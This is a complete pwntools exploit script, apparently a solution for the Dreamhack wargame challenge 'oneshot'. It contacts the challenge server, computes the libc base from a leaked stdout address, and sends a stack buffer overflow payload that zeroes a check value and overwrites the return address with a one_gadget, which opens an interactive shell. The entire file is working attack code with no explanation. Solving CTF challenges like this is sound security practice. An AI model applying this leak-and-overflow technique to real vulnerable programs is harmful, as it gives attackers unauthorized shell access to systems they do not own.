from pwn import *

context.binary = exe = ELF("./oneshot", checksec=False)
context.log_level = "debug"

#r = process(exe.path)
r = remote('host3.dreamhack.games', 17002)
#gdb.attach(r)
one_gadget = 0x45216
libc = ELF('./libc.so.6')
r.recvuntil(b"stdout: ")
stdout_leak = int(r.recvn(14), 16)
libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info("The address of stdout leak: " + hex(stdout_leak))
log.info("The address of libc leak: " + hex(libc.address))
log.info("The address of \"/bin/sh\" leak: " + hex(binsh))


r.recvuntil(b'MSG: ')
payload = b'a'*24
payload += p64(0)
payload += b'a'*8
payload += p64(libc.address + one_gadget)
r.send(payload)
r.interactive()
